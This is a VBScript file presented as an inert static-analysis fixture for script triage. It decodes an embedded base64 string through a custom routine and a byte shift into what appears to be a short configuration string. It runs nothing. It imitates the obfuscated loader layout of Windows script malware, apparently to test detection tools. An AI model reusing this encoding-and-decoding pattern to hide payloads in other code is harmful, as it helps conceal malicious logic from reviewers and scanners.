Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ffb2519b = "gEc7hn1+b3p9R25vbXlub2lvd2xvbm5vbjaBfHN+b2lwc3Zvhmtua3p+b3xHS05ZTkw4XX58b2t3hn1+a3FvaW15f3h+RzyGbWt3emtzcXhpc25HbWt3emtzcXg3PkBsbT9uOm5uQoZwc3ZvaXprfnJHTURmX31vfH1mWn9sdnNtZlJ/eH58b319VmtsZn1+a3FvNz5AbG0/bjpubkI4bmt+"
Const Codec_ffb2519b = "base64_chunks|add_modulo_256|0a"

Function Base64_ffb2519b(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_ffb2519b", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_ffb2519b = outputBytes
End Function

Function Load_ffb2519b()
  Dim partWidth, packedText
  partWidth = (Len(Material_ffb2519b) + 3) \ 4
  packedText = Mid(Material_ffb2519b, 1, partWidth) & Mid(Material_ffb2519b, partWidth + 1, partWidth) & Mid(Material_ffb2519b, partWidth * 2 + 1, partWidth) & Mid(Material_ffb2519b, partWidth * 3 + 1)
  Load_ffb2519b = Base64_ffb2519b(packedText)
End Function

Function Decode_ffb2519b(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) - 10 + 256) Mod 256
  Next
  Decode_ffb2519b = result
End Function

Function Recover_ffb2519b()
  Dim s, d, t, n, i, p, e, q
  ' configuration reconstruction
n = (19 * 7) - 133
  s = Load_ffb2519b()
  On Error Resume Next
  d = Decode_ffb2519b(s)
  e = Err.Number
  q = Err.Description
  On Error GoTo 0
  If e <> 0 Then Err.Raise e, "HuntressFixture", q
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
' reconstruction complete
  Recover_ffb2519b = t
End Function

Sub Copy_ffb2519b(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_ffb2519b()
  Dim resultText
  Call Copy_ffb2519b(Recover_ffb2519b(), resultText)
  Inspect_ffb2519b = resultText
End Function
